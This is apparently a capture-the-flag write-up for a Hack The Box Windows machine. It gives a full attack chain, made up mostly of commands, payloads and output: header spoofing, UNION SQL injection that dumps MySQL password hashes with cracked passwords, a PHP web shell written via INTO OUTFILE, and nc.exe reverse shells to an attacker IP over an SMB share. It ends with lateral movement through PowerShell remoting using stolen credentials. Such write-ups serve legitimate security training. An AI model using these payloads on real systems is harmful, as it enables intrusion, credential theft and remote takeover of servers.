### Enum
```bash
feroxbuster -u http://10.129.157.71:80/ -t 10 -w /root/.local/share/AutoRecon/wordlists/dirbuster.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -q -e -r -o 

200      GET        1l       15w       89c http://10.129.157.71/ADMIN.php
```

##### page source of admin.php
```php
<!-- To Do:
	- Import Products
	- Link to new payment system
	- Enable SSL (Certificates location \\192.168.4.28\myfiles)
<!-- Header -->
```

##### wfuzz the host header
* https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers

Get the `http_header.list` through ChatGPT. Although, that's not 100% correct.

So let's use `http-request-headers-fields-large.txt`

```bash
wfuzz -c -w http_header.list -u http://$IP/admin.php -H "FUZZ: 192.168.4.28"

# Filter the chars
# --hc/hl/hw/hh N[,N]+      : Hide responses with the specified code/lines/words/chars

wfuzz -c -w /usr/share/seclists/Miscellaneous/web/http-request-headers/http-request-headers-fields-large.txt -u http://$IP/admin.php -H "FUZZ: 192.168.4.28" --hh 89

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                    
=====================================================================

000000145:   400        6 L      34 W       374 Ch      "Content-Length"                        
000000732:   501        6 L      26 W       343 Ch      "Transfer-Encoding"                
000000923:   200        153 L    466 W      7933 Ch     "X-Forwarded-For"    
```

Use `simple-modify-headers` on github. Or add a `Request header` from the "Match and replace rules" under Burp proxy tab. 

### Web Enum
Now, I get the access of `admin.php`. Setup with `simple-modify-headers` with burp, let's SEARCH the sqli since it's quite obvious.

#### SQLI find number of columns
1. `'` 

```bash burp
POST /search_products.php HTTP/1.1
Host: 10.129.170.188
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
Origin: http://10.129.170.188
Connection: close
Referer: http://10.129.170.188/admin.php
Upgrade-Insecure-Requests: 1
X-Forwarded-For: 192.168.4.28
-: -

productName='

Error: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''''' at line 1		
```

2. `DWA'#`

No Products Found, it's same result as the legit `DWA`.

3. `' order by 7-- -`
						Error: SQLSTATE[42S22]: Column not found: 1054 Unknown column '7' in 'order clause'

So it has 6 columns.

#### Extract database names, table names and column names
* https://book.hacktricks.xyz/pentesting-web/sql-injection#extract-database-names-table-names-and-column-names
* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#extract-database-with-information_schema
* https://github.com/A1vinSmith/OSCP-PWK/wiki/SQL-Injection

The HTB Academy cheatsheet is also good.

###### list database names
```sql
productName='+Union+Select+1,2,3,4,5,gRoUp_cOncaT(0x7c,schema_name,0x7c)+fRoM+information_schema.schemata--+-
```

|information_schema|,|mysql|,|warehouse|

###### Current database name and user
```sql
'+Union+Select+1,2,3,4,5,database()--+-

'+Union+Select+1,2,3,4,5,user()--+-
```

warehouse

manager@localhost

###### List all tables in a specific database, warehouse
```sql
' UniOn Select 1,2,3,4,5,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema='warehouse'-- -
' UNION select 1,2,3,4,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.TABLES where table_schema='warehouse'-- -
```

|product|,|product_category|,|product_pack| Nothing interested

##### Grab internal password from mysql
```sql
' UniOn Select 1,2,3,4,5,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema='mysql'-- -

' UniOn Select 1,2,3,4,5,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name='user'-- -

' UNION select Grant_priv,Super_priv,Select_priv,host,User,password from mysql.user-- -

' union select grantee,privilege_type,is_grantable,4,5,6 from information_schema.user_privileges#
```

```php
|columns_priv|,|column_stats|,|db|,|event|,|func|,|general_log|,|global_priv|,|gtid_slave_pos|,|help_category|,|help_keyword|,|help_relation|,|help_topic|,|index_stats|,|innodb_index_stats|,|innodb_table_stats|,|plugin|,|proc|,|procs_priv|,|proxies_priv|,|roles_mapping|,|servers|,|slow_log|,|tables_priv|,|table_stats|,|time_zone|,|time_zone_leap_second|,|time_zone_name|,|time_zone_transition|,|time_zone_transition_type|,|transaction_registry|,|user|

|Host|,|User|,|Password|,|Select_priv|,|Insert_priv|,|Update_priv|,|Delete_priv|,|Create_priv|,|Drop_priv|,|Reload_priv|,|Shutdown_priv|,|Process_priv|,|File_priv|,|Grant_priv|,|References_priv|,|Index_priv|,|Alter_priv|,|Show_db_priv|,|Super_priv|,|Create_tmp_table_priv|,|Lock_tables_priv|,|Execute_priv|,|Repl_slave_priv|,|Repl_client_priv|,|Create_view_priv|,|Show_view_priv|,|Create_routine_priv|,|Alter_routine_priv|,|Create_user_priv|,|Event_priv|,|Trigger_priv|,|Create_tablespace_priv|,|Delete_history_priv|,|ssl_type|,|ssl_cipher|,|x509_issuer|,|x509_subject|,|max_questions|,|max_updates|,|max_connections|,|max_user_connections|,|plugin|,|authentication_string|,|password_expired|,|is_role|,|default_role|,|max_statement_time|
```
Data written to the HTMLs.

```txt
0A4A5CAD344718DC418035A1F4D292BA603134D8	Unknown	Not found.
CFE3EEE434B38CBF709AD67A4DCDEA476CBA7FDA	MySQL4.1+	l3tm3!n              manager
0E178792E8FC304A2E3133D535D38CAF1DA3CD9D	MySQL4.1+	l33th4x0rhector      hector
```

Both hector and root seem to have all the privileges. manager seems to have one, FILE which is the current user.

### Foothold
* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-write-a-shell

```sql
' union select "",'<?php system($_REQUEST[0]); ?>', "", "", "", "" into outfile '/var/www/html/shell.php'-- -
```
						Error: SQLSTATE[HY000]: General error: 1 Can't create/write to file '\var\www\html\shell.php' (Errcode: 2 "No such file or directory")	

##### Find which directories can be accessed through MySQL(MariaDB)
```sql
' UNION SELECT 1, variable_name, variable_value, 4,5,6 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```

SECURE_FILE_PRIV, wait a sec. It's a Windows machine

```sql
' UNION SELECT "<?php system($_GET['cmd']); ?>", "", "", "", "", "" into outfile "C:\\xampp\\htdocs\\backdoor.php"#

' UNION SELECT "<?php system($_GET['cmd']); ?>", "", "", "", "", "" into outfile "C:\\wwwroot\\shell.php"-- -

' UNION SELECT "<?php system($_GET['cmd']); ?>", "", "", "", "", "" into outfile "C:\\wamp\\www\\shell.php"-- -
```

```php result

						Error: SQLSTATE[HY000]: General error: 1 Can't create/write to file 'C:\xampp\htdocs\backdoor.php' (Errcode: 2 "No such file or directory")

```

##### Found the working one
```sql
' UNION SELECT "<?php system($_GET['cmd']); ?>", "", "", "", "", "" into outfile "C:\\inetpub\\wwwroot\\shell.php"#
```

Error: SQLSTATE[HY000]: General error		
But it worked even with the error.

```cmd
http://10.129.170.188/shell.php?cmd=cd
C:\inetpub\wwwroot 
```

##### Get the reverse shell through burp
1. It can be done through a smb session which use the `nc.exe` from the Kali share. In this way, victim doesn't have to download anyfile.

```conf
[Public]
	path = /home/alvin/Public
	writable = no
	guest ok = yes
	guest only = yes
	read only = yes
	create mode = 0777
	directory mode = 077
	force user = alvin
	# force user = nobody isn't working for me
```

`http://control.htb/shell.php?cmd=\\10.10.16.4\Public\nc.exe 10.10.16.4 443 -e powershell`

* http://control.htb/shell.php?cmd=\\10.10.16.4\Public\nc.exe%2010.10.16.4%20443%20-e%20powershell

2. MSbuild XML

* https://snowscan.io/htb-writeup-control/#

Defender is running on this machine so my earlier attempst at uploading a meterpreter compiled EXE file failed and using the PHP meterpreter proved to be somewhat unstable. However I was able to generate an MSbuild XML `meterpreter/reverse_tcp ` payload with GreatSCT and get a stable shell.

First, I’ll upload the .xml file I’ve generated:
```bash
sqlmap -u "http://control.htb/view_product.php" --data "productId=69" --file-write 9001.xml --file-dest 'c:\inetpub\wwwroot\uploads\9001.xml'
```
Then compile and execute the payload using my webshell:

```bash
curl 10.10.10.167/uploads/bobinette.php?c='C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe%20c:\inetpub\wwwroot\uploads\9001.xml'
```

Or upload a fancy webshell to upload nc.exe instead compiled XML.
* https://t3chnocat.com/htb-control/

I chose the first one since I didn't use `sqlmap`

### Lateral movement
##### Getting access as user Hector
There’s two easy ways to get a shell as Hector using the credentials found in the database:

1. Port forward port 5985 and land a shell using WinRM
```powershell
PS C:\inetpub\wwwroot> net user hector
net user hector
User name                    Hector
Full Name                    Hector
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            11/1/2019 12:27:50 PM
Password expires             Never
Password changeable          11/1/2019 12:27:50 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   10/26/2023 5:38:16 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use*Users   <- Remote Management User group who can run over WinRM        
Global Group memberships     *None                 
The command completed successfully.

netstat -ano

TCP    [::]:5985              [::]:0                 LISTENING       4
```

One interesting here is that you could use meterpreter to do so eaisly instead of chisel

`portfwd add -l 5985 -p 5985 -r 127.0.0.1`

* https://snowscan.io/htb-writeup-control/#

2. Reuse the netcat with Hector's creds by Invoke
```cmd powershell
$SecPassword = ConvertTo-SecureString 'l33th4x0rhector' -AsPlainText -Force
# SPN is composed of a service, hostname, and may a port in form of service/hostname[:port] such as host/fs.contoso.com . 
$Cred = New-Object System.Management.Automation.PSCredential('Fidelity\hector', $SecPassword)

$session = New-PSSession -ComputerName Fidelity -Credential $Cred
# Invoke-Command -Session $session -ScriptBlock {Start-Process cmd}
Invoke-Command -Session $session -ScriptBlock {ping -n 2 10.10.16.4}
Invoke-Command -Session $session -ScriptBlock {\\10.10.16.4\Public\nc.exe 10.10.16.4 80 -e powershell}

# Althernatively
# Invoke-Command -credential $Cred -ScriptBlock { \\10.10.16.4\Public\nc.exe -e cmd 10.10.16.4 80 } -computer localhost
```

```cmd hector powershell
sudo rlwrap -cAr nc -lvnp 80
[sudo] password for alvin: 
listening on [any] 80 ...
connect to [10.10.16.4] from (UNKNOWN) [10.129.134.148] 49690
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Hector\Documents> whoami
whoami
control\hector
```

### Root
##### Powershell History
* https://woshub.com/powershell-commands-history/